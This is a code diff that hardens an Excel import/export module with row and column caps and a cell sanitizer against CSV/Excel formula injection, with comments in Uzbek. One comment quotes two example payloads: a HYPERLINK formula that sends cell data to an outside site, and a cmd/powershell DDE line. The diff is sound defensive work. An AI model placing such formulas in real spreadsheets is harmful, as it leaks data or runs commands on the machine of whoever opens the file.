@@ -13,6 +13,19 @@ import * as XLSX from "xlsx";
 /** Bir faylda ruxsat etilgan maksimal qator soni (sarlavhadan tashqari). */
 export const MAX_IMPORT_ROWS = 1000;
 
+/**
+ * O'qishning QATTIQ chegarasi: chegaradan bitta ortiq qator o'qiladi.
+ *
+ * Nima uchun "+1": chaqiruvchi kod `rows.length > MAX_IMPORT_ROWS` deb
+ * tekshiradi. Agar biz roppa-rosa 1000 tada to'xtatsak, 5000 qatorli fayl
+ * jimgina birinchi 1000 qatori bilan import bo'lib ketardi — foydalanuvchi
+ * buni sezmasdi. 1001 o'qisak, tekshiruv ishlaydi va xato ko'rsatiladi.
+ */
+const PARSE_ROW_CAP = MAX_IMPORT_ROWS + 1;
+
+/** Ustunlar chegarasi — minglab ustunli soxta fayl xotirani yeb qo'ymasin. */
+const PARSE_COLUMN_CAP = 200;
+
 /** Maksimal fayl hajmi — 5 MB. */
 export const MAX_IMPORT_FILE_BYTES = 5 * 1024 * 1024;
 
@@ -58,6 +71,36 @@ function cellToString(value: unknown): string {
   return String(value).trim();
 }
 
+/**
+ * FORMULA INJECTION HIMOYASI (CSV/Excel injection)
+ * ================================================
+ *
+ * HUJUM QANDAY ISHLAYDI:
+ * Hujumchi o'quvchi ismi yoki izoh maydoniga oddiy matn emas, formula yozadi:
+ *
+ *   =HYPERLINK("https://oqri.uz/?d="&A1&A2,"Natijani ko'rish")
+ *   =cmd|'/c powershell ...'!A1
+ *
+ * Bazada bu shunchaki matn — zarari yo'q. Lekin ADMIN eksport tugmasini
+ * bosib, yuklab olingan .xlsx ni O'Z KOMPYUTERIDA ochganda Excel buni
+ * FORMULA deb biladi va bajaradi. Natijada butun jadval hujumchining
+ * saytiga jo'natilishi yoki kompyuterda buyruq ishga tushishi mumkin.
+ *
+ * Ya'ni ma'lumot serverdan emas, adminning shaxsiy kompyuteridan sizadi —
+ * server loglarida hech qanday iz qolmaydi.
+ *
+ * YECHIM (OWASP tavsiyasi): xavfli belgi bilan boshlanuvchi matn oldiga
+ * apostrof qo'yiladi. Excel uni "bu matn" deb tushunadi, ekranda apostrof
+ * ko'rinmaydi, formula esa ishga tushmaydi.
+ */
+const DANGEROUS_CELL_START = /^[=+\-@\t\r]/;
+
+export function sanitizeExcelCell(value: string | number): string | number {
+  if (typeof value !== "string") return value;
+  if (value === "") return value;
+  return DANGEROUS_CELL_START.test(value) ? `'${value}` : value;
+}
+
 export function isAllowedExcelFile(fileName: string): boolean {
   const lower = fileName.toLowerCase();
   return ALLOWED_IMPORT_EXTENSIONS.some((ext) => lower.endsWith(ext));
@@ -66,6 +109,10 @@ export function isAllowedExcelFile(fileName: string): boolean {
 /**
  * Excel faylining BIRINCHI varag'ini o'qiydi.
  * Bo'sh qatorlar tashlab ketiladi, qiymatlar matn sifatida qaytadi.
+ *
+ * Xavfsizlik: 5 MB lik siqilgan .xlsx ochilganda millionlab katakka
+ * yoyilishi mumkin ("zip bomb") — shuning uchun qator va ustun soni
+ * qat'iy cheklangan. Fayl hajmi tekshiruvi bundan oldin, action'da.
  */
 export function parseExcel(buffer: ArrayBuffer): ParsedSheet {
   const workbook = XLSX.read(new Uint8Array(buffer), {
@@ -88,12 +135,16 @@ export function parseExcel(buffer: ArrayBuffer): ParsedSheet {
   const headerRow = matrix[0];
   if (!headerRow) return { headers: [], keys: [], rows: [] };
 
-  const headers = headerRow.map((cell) => cellToString(cell));
+  const headers = headerRow
+    .slice(0, PARSE_COLUMN_CAP)
+    .map((cell) => cellToString(cell));
   const keys = headers.map((header) => normalizeKey(header));
 
   const rows: SheetRow[] = [];
 
   for (let index = 1; index < matrix.length; index += 1) {
+    if (rows.length >= PARSE_ROW_CAP) break;
+
     const cells = matrix[index] ?? [];
     const values: Record<string, string> = {};
     let hasValue = false;
@@ -113,12 +164,18 @@ export function parseExcel(buffer: ArrayBuffer): ParsedSheet {
   return { headers, keys, rows };
 }
 
-/** Matritsadan `.xlsx` fayl yasaydi (shablon va eksport uchun). */
+/**
+ * Matritsadan `.xlsx` fayl yasaydi (shablon va eksport uchun).
+ *
+ * Har bir katak `sanitizeExcelCell` dan o'tadi — bazadagi matn faylni
+ * ochgan odamning kompyuterida formulaga aylanib ketmasligi uchun.
+ */
 export function buildExcel(rows: (string | number)[][], sheetName: string): Buffer {
-  const sheet = XLSX.utils.aoa_to_sheet(rows);
+  const safeRows = rows.map((row) => row.map((cell) => sanitizeExcelCell(cell)));
+  const sheet = XLSX.utils.aoa_to_sheet(safeRows);
 
   // Ustun kengligini sarlavha uzunligiga qarab beramiz — fayl o'qishga qulay bo'ladi.
-  const header = rows[0] ?? [];
+  const header = safeRows[0] ?? [];
   sheet["!cols"] = header.map((cell) => ({
     wch: Math.min(Math.max(String(cell).length + 4, 12), 40),
   }));
